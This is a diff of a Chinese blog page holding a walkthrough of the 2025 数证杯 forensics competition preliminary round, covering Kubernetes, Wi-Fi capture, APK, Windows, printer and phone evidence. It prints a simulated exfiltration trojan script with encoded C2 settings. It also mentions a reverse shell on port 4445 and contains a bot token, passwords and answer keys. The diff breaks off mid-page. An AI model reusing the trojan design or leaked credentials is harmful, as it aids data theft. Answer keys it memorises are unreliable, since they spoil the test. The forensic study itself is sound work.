@@ -1,792 +1,170 @@
-<!DOCTYPE html>
-<html lang="en" dir="auto">
-
-<head><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
-<title>数证杯 2025 初赛 | w8nn9z Blog</title>
-<meta name="keywords" content="">
-<meta name="description" content="数证杯 2025 初赛 - w8nn9z Blog">
-<meta name="author" content="">
-<link rel="canonical" href="https://z9nn8w.github.io/posts/forensics/szb2025cs/">
-
-<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
-<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/forensics/szb2025cs/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --theme: rgb(29, 30, 32);
-                --entry: rgb(46, 46, 51);
-                --primary: rgb(218, 218, 219);
-                --secondary: rgb(155, 156, 157);
-                --tertiary: rgb(65, 66, 68);
-                --content: rgb(196, 196, 197);
-                --code-block-bg: rgb(46, 46, 51);
-                --code-bg: rgb(55, 56, 62);
-                --border: rgb(51, 51, 51);
-            }
-
-            .list {
-                background: var(--theme);
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
-            }
-        }
-
-    </style>
-</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/forensics/szb2025cs/">
-  <meta property="og:site_name" content="w8nn9z Blog">
-  <meta property="og:title" content="数证杯 2025 初赛">
-  <meta property="og:locale" content="zh-cn">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-11-01T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-11-03T00:00:00+00:00">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="数证杯 2025 初赛">
-<meta name="twitter:description" content="">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://z9nn8w.github.io/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "FORENSICS",
-      "item": "https://z9nn8w.github.io/posts/forensics/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  3 ,
-      "name": "数证杯 2025 初赛",
-      "item": "https://z9nn8w.github.io/posts/forensics/szb2025cs/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "数证杯 2025 初赛",
-  "name": "数证杯 2025 初赛",
-  "description": "",
-  "keywords": [
-    
-  ],
-  "articleBody": "案情介绍 无\n检材解密/挂载 容器密码：GQ7aXryvOCM8qGeXa19K9g\u0026jtHSGtrimps@QxaYt4oRwwKHeN0A$#EPv*u\nveracrypt：\n服务器取证 网站重构：\n一个master + 两个node节点，仿真设置为 NAT 模式，网段设置为192.168.50.1/24\n虚拟网络编辑，VMnet8：\n配置网关：\nk8s namespace kubectl get namespaces：\nk8s pod kubectl get pods -A：\nk8s service kubectl get services -A：\n关闭localhost的防火墙：\nsystemctl stop firewalld 重建数据库：\nkubectl apply -f mysql-c.yaml\rkubectl apply -f mysql-d.yaml\rkubectl apply -f mysql80-pvc.yaml mysql 和 redis 的服务都在正常运行：\nweb服务的yaml php-nginx-deployment.yaml：\n# php-nginx-deployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: php-nginx spec: replicas: 1 selector: matchLabels: app: php-nginx template: metadata: labels: app: php-nginx spec: containers: - name: php-nginx image: webdevops/php-nginx:7.4 ports: - containerPort: 80 env: - name: APP_USER value: \"nginx\" volumeMounts: - name: dujiaoka-pv-storage mountPath: /app - name: nginx-config mountPath: /opt/docker/etc/nginx/vhost.conf subPath: vhost.conf - name: supervisor-config mountPath: /opt/docker/etc/supervisor.d/dujiaoka.conf volumes: - name: dujiaoka-pv-storage persistentVolumeClaim: claimName: dujiaoka - name: nginx-config configMap: name: nginx-dujiaoka-config - name: supervisor-config configMap: name: dujiaoka-supervisor-config --- apiVersion: v1 kind: Service metadata: name: php-nginx-service spec: selector: app: php-nginx ports: - port: 80 targetPort: 80 指定了挂载的目录 mountPath: /app ，localhost机器中把 dujiaoka.tar 解压到 /app\n1.node1节点的磁盘设备SHA256值前六位是？(字母全大写，答案格式：AAAAAA)\n源盘SHA256：\n答案：FC9A34\n2.集群配置了多少个node节点？（答案格式：1）\n答案：2\n3.嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00:00:00）\n答案：09:35:59\n4.Docker的安装日期是？（使用双位数格式，答案格式：01月01日）\n答案：04月08日\n5.Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）\n查看 Docker 服务的环境变量配置 systemctl show docker --property Environment：\n答案：4780\n6.发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）\n查看 Kubernetes 集群中的 Service（服务）kubectl get svc：\n答案：30627\n7.发卡网站部署使用的镜像名称是？（答案格式：root/root）\n根据上题的服务去找对应镜像：\n答案：webdevops/php-nginx\n8.当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）\n查看特定命名空间中的特定Pod详情 kubectl describe pod captcha-bot-6b4d85b765-4ntkh -n default：\n9.发卡网站使用的缓存数据库是？（答案格式：mysql）\npod里有redis\n答案：redis\n10.集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：/root/root）\n答案：/data/k8s_data/default/dujiaoka\n11.Telegram群管机器人配置的API代理域名是？（答案格式：www.xxx.com）\nlocalhost机器 /data/k8s_data/default/captchaBot/config/config.toml：\n#系统设置 [system] app_debbug=false join_hint_after_del_time=60 # 加群验证提示消息多久删除，秒 captcha_timeout=120 # 验证超时时间，秒 runtime_path=\"/runtime\" # 缓存目录 #telegram 配置 [telegram] bot_token=\"8378348497:AAGSu7pC5rrDicjMqa7Mv9atvB1iE5NAZeY\" # 机器人apitoken api_proxy=\"http://kk.xilika.cc\" # telegram api代理，仅大陆地区服务器需要 manage_users=[6213151597] # 超级管理员userid数组，以英文逗号分割，例如123,456,789 #日志配置 [log] max_size=32 max_age=7 max_backups=3 #消息模板 [message] join_hint=\"欢迎 [%s](%s) 加入 %s\\n ⚠️本群已开启新成员验证功能，未通过验证的用户无法发言 \\n超时未完成验证会被移除本群！ \\n⏱本条消息 %d 秒后自动删除\\n👇点击下方按钮自助解除禁言\" captcha_image=\"欢迎您加入[%s]！\\n⚠本群已开启新成员验证功能。\\n👆为了证明您不是机器人，请发送以上图片验证码内容\\n🤖机器人将自动验证您发送的验证码内容是否正确\\n⏱本条验证消息有效期[%d]秒\" verification_complete=\"恭喜您成功通过[🤖人机验证]，系统已为您解除禁言限制。\\n如若还是无法发言，请重启telegram客户端\\n请同时注意群内发言规范，以防永久禁止\" block_hint=\"\\\\#封禁预警\\n[%s](%s) 请注意,您的消息中含有部分违禁词 \\n⚠️您已被系统判断为高风险用户，已被封禁\\n系统已向超管发送预警信息，若由超管判定为误杀，会及时将您解除封禁。\\n您的违禁词包含：%s\" #广告阻止 [adblock] number_of_forbidden_words=2 # 违禁词判定个数，如果一句话中出现的违禁词为该设置个数，则判断为违禁 block_time=-1 # 阻止时间，单位：秒。如果为-1，则代表永久封禁 答案：kk.xilika.cc\n12.嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）\n答案：西门庆交流群\n13.统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）\ncaptchabot数据库查询：\nSELECT COUNT(*) FROM user_captcha_record WHERE captcha_success_time \u003e= '2025-06-01' ; 答案：2422\n14.据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）\n15. 发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）\n16.发卡网站的后台访问路径是？（答案格式：/root）\nlocalhost机器上有dujiaoka.tar，解压就是网址源码，.env：\n答案：/admin\n17.计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）\n仍然是.env：\n答案：UudHxLyk7HqpUcTQ99p6NZMFxC7eInhkagTLks8oYfk=\n18.发卡网站配置的邮件发送人地址是？（答案格式：abc@abc.com）\n19. 当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1.1.1）\n/config/dujiaoka.php：\n答案：2.0.5\n20. 当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）\n流量包分析 21.黑客攻击的目标路由器SSID为 （答案格式：请按实际值填写）\n22.黑客成功捕获了WIFI中WPA协议握手包，其中有效握手包组数为(完整握手为一组)（答案格式：1）\n使用过滤器 eapol 可以快速定位 WPA 握手的相关报文：\n答案：4\n23.黑客爆破得出的WiFi密码为（提示：密码由小写英文字母和数字组成）（答案格式：abcd1234）\n24.黑客成功连接Wifi后，发现路由器操作系统为？（答案格式：请按实际值填写）\n答案：Linux ImmortalWrt\n25.黑客对路由器后台进行爆破攻击，该路由器后台密码为（答案格式：请按实际值填写）\n26.黑客通过修改路由器设置，将被劫持的域名为（答案格式：www.xxx.com）\n27.黑客在路由器管理后台发现FTP服务配置，FTP登录密码为?（答案格式:请按实际值填写）\n过滤 FTP 协议：\n答案：mast\n28.黑客通过FTP上传了一个压缩包文件，该文件内容为（答案格式：请按实际值填写）\n找PK头：\n爆破密码 4321：\n答案：code:123456789\n29.黑客通过路由器执行shell脚本，反弹shell的监听端口为（答案格式：1）\n几个反弹shell关键词都找一遍，nc：\n答案：4445\n30.黑客通过反弹shell成功控制目标路由器后，总共执行了多少条命令（答案格式：1)\n根据ip 192.168.1.244 来过滤，再翻到最下面的部分找：\n执行的命令：\nipconfig\runame -a\rcd /root\rls 答案：4\nAPK程序分析 31.apk 的版本名称为？ （答案格式：1.1.1）\nAndroidManifest.xml：\nandroid:versionName=\"3.0.12\" 答案：3.0.12\n32.在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）\n在线网站 51.al 脱壳，jadx 反编译 classes2.dex：\n答案：currentTimeMillis\n33.apk运行后getVer()的返回值是多少？（答案格式：1.0.0）\n计算机取证分析 41.操作系统的 Build 版本号是？（答案格式：1）\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion：\n答案：19044\n42.操作系统设置的账户密码最长存留期为多少天？（答案格式：1）\n仿真后命令行输入 net accounts ：\n答案：68\n46.123.VHD 所处的结束扇区是？（答案格式：1）\n先找到 123.vhd，在 C:\\\\Administrator\\Documents 中，在 File 选中文件尾部或直接 Ctrl+End，再回到 Partition 即可找到文件结束扇区：\n答案：27445225\n物联网设备取证分析 66.打印机的主机名称是什么？(答案格式：root)\n答案：print\n67.打印文件存储在哪个目录？(答案格式：/root/root)\n/etc/cups/cups-files.conf：\n# Location of all spool files... #RequestRoot /var/spool/cups 答案：/var/spool/cups\n68.同一天，打印两份文件的用户是谁？(答案格式：root)\n/var/log/cups/page_log：\n答案：alice\n69.分析物联网检材，木马运行后，自身产生的进程ID是多少？（答案格式：1）\n木马 /usr/local/bin/cups-helper：\n#!/usr/bin/python3 # -*- coding: utf-8 -*- # A helper script to manage CUPS spooling and perform health checks. # Do not modify unless you are an authorized technician. # KVJEYIHHXSLOPIEBEAWT4ICCMFZWKNRUEDT3ZFXHUCASALJ6EDS23F7HVSTOJOFS4WHY32F5VQ====== import os import shutil import socket import datetime import re # --- Configuration --- # C2 server for uploading diagnostic data C2_SERVER = \"zUTMugDMx4SO5EjL1gTM\" C2_PORT = \"zQDN\" # Spool directory to monitor SPOOL_DIR = \"GJTJzBXdjZkMlw2bvB3cGJTJyFmdGJTJ\" # Define staging directory for processing before exfiltration STAGING_DIR = \"GJTJlh2YhNmLGJTJw1GdGJTJ\" # Log file for upload activities LOG_FILE = \"==wZvxmLkF2bsBXdGJTJlJXYoNnRyUCbhN2bs5iRyUCdv9mcGJTJ\" # Keyword to identify sensitive documents for \"special handling\" WATCHED_KEYWORD = \"=UmcpZmbvdWYyREMyUCdjVmavJHU\" # --- End Configuration --- def log_message(message): \"\"\"Appends a timestamped message to the log file.\"\"\" now = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\") full_message = f\"[{now}] {message}\\n\" with open(LOG_FILE, 'a') as f: f.write(full_message) def scan_and_stage(): \"\"\"(Simulated) Scans the spool directory and copies sensitive files to the staging area.\"\"\" pass def exfiltrate_data(): \"\"\"(Simulated) 'Uploads' files from the staging directory to the C2 server.\"\"\" if not os.path.exists(STAGING_DIR): return staged_files = os.listdir(STAGING_DIR) if not staged_files: return try: # The system log entry shows this connection attempt. # This part of the script provides the \"ground truth\" for that log. sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) # sock.connect((C2_SERVER, C2_PORT)) for filename in staged_files: log_message(f\"SUCCESS: Uploaded {filename} to {C2_SERVER}\") sock.close() except Exception as e: log_message(f\"ERROR: Could not connect to C2 server: {e}\") def main(): scan_and_stage() exfiltrate_data() if __name__ == \"__main__\": main() 答案：2177\n70.分析物联网检材，系统中存在一个非标定时任务，这个任务每隔多少分钟执行？（答案格式：1）\n火眼的定时任务只分析了 /etc/crontab 文件里的内容，/etc/cron.d 目录下还有其他的定时任务，healthcheck：\n答案：10\n71.分析物联网检材，木马程序会窃取文档暂存在隐藏目录，这个目录的绝对路径？（/root/root/）\n先逆置再解base64：GJTJlh2YhNmLGJTJw1GdGJTJ\n答案：/tmp/.cache/\n72.分析物联网检材，木马程序将数据上传到的服务器的IP地址是多少？（答案格式：1.1.1.1）\n先逆置再解base64：zUTMugDMx4SO5EjL1gTM\n答案：185.199.108.153\n73.根据木马程序，它监视的关键字是什么？（答案格式：按照实际情况填写）\n先逆置再解base64：=UmcpZmbvdWYyREMyUCdjVmavJHU\n答案：Project Dragonfire\n移动终端取证分析 火眼识别不了rar，先解压再把data压缩成zip\n74.分析检材中微信ID:wxid_f4s0jmpvrc522对应的手机号后四位为（答案格式：1111）\n答案：8390\n75.分析检材中“华为应用市场”第一次安装日期为（使用双位数格式，答案格式：01月01日）\n答案：09月24日\n76.找出检材中钱包APP，请列出该APP中ETH地址后六位是（字母全大写，答案格式：AAAAAA）\n答案：3FE61F\n77.分析出检材中包含“南昌西站”的图片，计算该图片的MD5后六位？（字母全大写，答案格式：AAAAAA）\n答案：85A51D\n78.手机相册中有张“imtoken助记词1.PNG”图片被破坏，请修复该图片，列出该图片中第三个单词。（答案格式：按照实际情况填写）\n宽高爆破：\n$ python 1.py -f 1.PNG 宽高被改了, 是否CRC爆破宽高? (Y/n):Y CRC32: 0xf2e8fe18 宽度: 1809, hex: 0x711 高度: 222, hex: 0xde 答案：boost\n79.找出一张PNG图片，该图片上显示“助记词2”，请列出该图片上显示的第二个单词。（答案格式：按照实际情况填写）\n答案：delay\n80.找出检材中显示“助记词3”的文档，列出该文档中记录的第三个助记词单词。（答案格式：按照实际情况填写）\n全局搜索 助记词3 ，可以找到备忘录文件，直接打开看不到，藏在文件尾：\n答案：quarter\n81.分析出该组助记词正常顺序中最后一个单词（已知助记词1.助记词2.助记词3中的单词顺序有被调整）。（答案格式：按照实际情况填写）\n82.分析出邮箱中收件人QQ号为“850563586”的姓名（答案格式：按照实际情况填写）\n答案：刘佳雨\n83.得知机主通过某个应用给HHshAL发送了一个文档，该应用的数据包名是什么？（答案格式：com.test）\n答案：dingtong.saichuang\n84.接上题，该应用聊天记录数据库的打开密码是什么？（答案格式：按照实际情况填写）\n数据库 dingtong.db 被加密过\n85.接上题，机主发送的这个加密文档，打开密码是什么？（答案格式：按照实际情况填写）\n86.厉明的身份证地址登记的门牌号是多少？？（答案格式：1）\n身份证_f33.mxt是个zip，需要密码：\n密码：bwX2ZEfE9\n答案：722\n87.分析出“important1.xlsx”文件中体现的“金达欣”银行卡后六位？（答案格式：111111）\nimportant1.xlsx需要密码\n密码：3;s=]-\n答案：935629\n88.接上题，保存“important1.xlsx”打开密码数据的应用，该应用的启动密码是什么？（答案格式：按照实际情况填写）\n答案：3357\n",
-  "wordCount" : "5218",
-  "inLanguage": "en",
-  "datePublished": "2025-11-01T00:00:00Z",
-  "dateModified": "2025-11-03T00:00:00Z",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://z9nn8w.github.io/posts/forensics/szb2025cs/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "w8nn9z Blog",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://z9nn8w.github.io/favicon.ico"
-    }
-  }
-}
-</script>
-</head>
-
-<body class="" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
-            <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                </button>
-            </div>
-        </div>
-        <ul id="menu">
-            <li>
-                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
-                    <span>搜索</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/posts" title="文章">
-                    <span>文章</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/archives" title="归档">
-                    <span>归档</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/about" title="关于">
-                    <span>关于</span>
-                </a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<main class="main">
-
-<article class="post-single">
-  <header class="post-header">
-    
-    <h1 class="post-title entry-hint-parent">
-      数证杯 2025 初赛
-    </h1>
-    <div class="post-meta"><span title='2025-11-01 00:00:00 +0000 UTC'>November 1, 2025</span>
-
-</div>
-  </header> <aside id="toc-container" class="toc-container wide">
-    <div class="toc">
-        <details >
-            <summary accesskey="c" title="(Alt + C)">
-                <span class="details">Table of Contents</span>
-            </summary>
-
-            <div class="inner"><ul>
-                    <li>
-                        <a href="#%e6%a1%88%e6%83%85%e4%bb%8b%e7%bb%8d" aria-label="案情介绍">案情介绍</a></li>
-                    <li>
-                        <a href="#%e6%a3%80%e6%9d%90%e8%a7%a3%e5%af%86%e6%8c%82%e8%bd%bd" aria-label="检材解密/挂载">检材解密/挂载</a></li>
-                    <li>
-                        <a href="#%e6%9c%8d%e5%8a%a1%e5%99%a8%e5%8f%96%e8%af%81" aria-label="服务器取证">服务器取证</a></li>
-                    <li>
-                        <a href="#%e6%b5%81%e9%87%8f%e5%8c%85%e5%88%86%e6%9e%90" aria-label="流量包分析">流量包分析</a></li>
-                    <li>
-                        <a href="#apk%e7%a8%8b%e5%ba%8f%e5%88%86%e6%9e%90" aria-label="APK程序分析">APK程序分析</a></li>
-                    <li>
-                        <a href="#%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e5%88%86%e6%9e%90" aria-label="计算机取证分析">计算机取证分析</a></li>
-                    <li>
-                        <a href="#%e7%89%a9%e8%81%94%e7%bd%91%e8%ae%be%e5%a4%87%e5%8f%96%e8%af%81%e5%88%86%e6%9e%90" aria-label="物联网设备取证分析">物联网设备取证分析</a></li>
-                    <li>
-                        <a href="#%e7%a7%bb%e5%8a%a8%e7%bb%88%e7%ab%af%e5%8f%96%e8%af%81%e5%88%86%e6%9e%90" aria-label="移动终端取证分析">移动终端取证分析</a>
-                    </li>
-                </ul>
-            </div>
-        </details>
-    </div>
-</aside>
-<script>
-    let activeElement;
-    let elements;
-    
-    document.addEventListener('DOMContentLoaded', function (event) {
-        checkTocPosition();
-    
-        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
-        if (elements.length > 0) {
-            
-            activeElement = elements[0];
-            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
-            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
-        }
-    
-        
-        const topLink = document.getElementById('top-link');
-        if (topLink) {
-            topLink.addEventListener('click', (event) => {
-                
-                event.preventDefault();
-    
-                
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-            });
-        }
-    }, false);
-    
-    window.addEventListener('resize', function(event) {
-        checkTocPosition();
-    }, false);
-    
-    window.addEventListener('scroll', () => {
-        
-        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
-    
-        
-        if (scrollPosition === 0) {
-            return;
-        }
-    
-        
-        if (elements && elements.length > 0) {
-            
-            activeElement = Array.from(elements).find((element) => {
-                if ((getOffsetTop(element) - scrollPosition) > 0 && 
-                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
-                    return element;
-                }
-            }) || activeElement;
-    
-            elements.forEach(element => {
-                const id = encodeURI(element.getAttribute('id')).toLowerCase();
-                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
-                if (element === activeElement){
-                    tocLink.classList.add('active');
-    
-                    
-                    const tocContainer = document.querySelector('.toc .inner');
-                    const linkOffsetTop = tocLink.offsetTop;
-                    const containerHeight = tocContainer.clientHeight;
-                    const linkHeight = tocLink.clientHeight;
-    
-                    
-                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
-                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
-                } else {
-                    tocLink.classList.remove('active');
-                }
-            });
-        }
-    }, false);
-    
-    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
-    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
-    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
-    
-    function checkTocPosition() {
-        const width = document.body.scrollWidth;
-    
-        if (width - main - (toc * 2) - (gap * 4) > 0) {
-            document.getElementById("toc-container").classList.add("wide");
-        } else {
-            document.getElementById("toc-container").classList.remove("wide");
-        }
-    }
-    
-    function getOffsetTop(element) {
-        if (!element.getClientRects().length) {
-            return 0;
-        }
-        let rect = element.getBoundingClientRect();
-        let win = element.ownerDocument.defaultView;
-        return rect.top + win.pageYOffset;   
-    }
-    
-</script>
-
-  <div class="post-content"><h2 id="案情介绍">案情介绍<a hidden class="anchor" aria-hidden="true" href="#案情介绍">#</a></h2>
-<p>无</p>
-<h2 id="检材解密挂载">检材解密/挂载<a hidden class="anchor" aria-hidden="true" href="#检材解密挂载">#</a></h2>
-<p>容器密码：GQ7aXryvOC<em>M8qG</em>eXa19K9<em>g&amp;jtHS</em>Gtrimps@Qx<em>aYt4oRwwK</em>HeN0A$#EPv*u</p>
-<p>veracrypt：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/31.png"></p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/32.png"></p>
-<h2 id="服务器取证">服务器取证<a hidden class="anchor" aria-hidden="true" href="#服务器取证">#</a></h2>
-<p>网站重构：</p>
-<p>一个master + 两个node节点，仿真设置为 NAT 模式，网段设置为192.168.50.1/24</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/33.png"></p>
-<p>虚拟网络编辑，VMnet8：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/34.png"></p>
-<p>配置网关：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/35.png"></p>
-<p>k8s namespace <code>kubectl get namespaces</code>：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/41.png"></p>
-<p>k8s pod <code>kubectl get pods -A</code>：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/42.png"></p>
-<p>k8s service <code>kubectl get services -A</code>：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/43.png"></p>
-<p>关闭localhost的防火墙：</p>
-<pre tabindex="0"><code>systemctl stop firewalld
-</code></pre><p>重建数据库：</p>
-<pre tabindex="0"><code>kubectl apply -f mysql-c.yaml
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>数证杯 2025 初赛 | w8nn9z Blog</title><meta name=keywords content><meta name=description content="数证杯 2025 初赛 - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://blog.w8nn9z.top/posts/forensics/szb2025cs/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://blog.w8nn9z.top/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.w8nn9z.top/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.w8nn9z.top/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.w8nn9z.top/apple-touch-icon.png><link rel=mask-icon href=https://blog.w8nn9z.top/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://blog.w8nn9z.top/posts/forensics/szb2025cs/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://blog.w8nn9z.top/posts/forensics/szb2025cs/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="数证杯 2025 初赛"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-11-01T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-03T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="数证杯 2025 初赛"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.w8nn9z.top/posts/"},{"@type":"ListItem","position":2,"name":"FORENSICS","item":"https://blog.w8nn9z.top/posts/forensics/"},{"@type":"ListItem","position":3,"name":"数证杯 2025 初赛","item":"https://blog.w8nn9z.top/posts/forensics/szb2025cs/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"数证杯 2025 初赛","name":"数证杯 2025 初赛","description":"","keywords":[],"articleBody":"案情介绍 无\n检材解密/挂载 容器密码：GQ7aXryvOCM8qGeXa19K9g\u0026jtHSGtrimps@QxaYt4oRwwKHeN0A$#EPv*u\nveracrypt：\n服务器取证 网站重构：\n一个master + 两个node节点，仿真设置为 NAT 模式，网段设置为192.168.50.1/24\n虚拟网络编辑，VMnet8：\n配置网关：\nk8s namespace kubectl get namespaces：\nk8s pod kubectl get pods -A：\nk8s service kubectl get services -A：\n关闭localhost的防火墙：\nsystemctl stop firewalld 重建数据库：\nkubectl apply -f mysql-c.yaml\rkubectl apply -f mysql-d.yaml\rkubectl apply -f mysql80-pvc.yaml mysql 和 redis 的服务都在正常运行：\nweb服务的yaml php-nginx-deployment.yaml：\n# php-nginx-deployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: php-nginx spec: replicas: 1 selector: matchLabels: 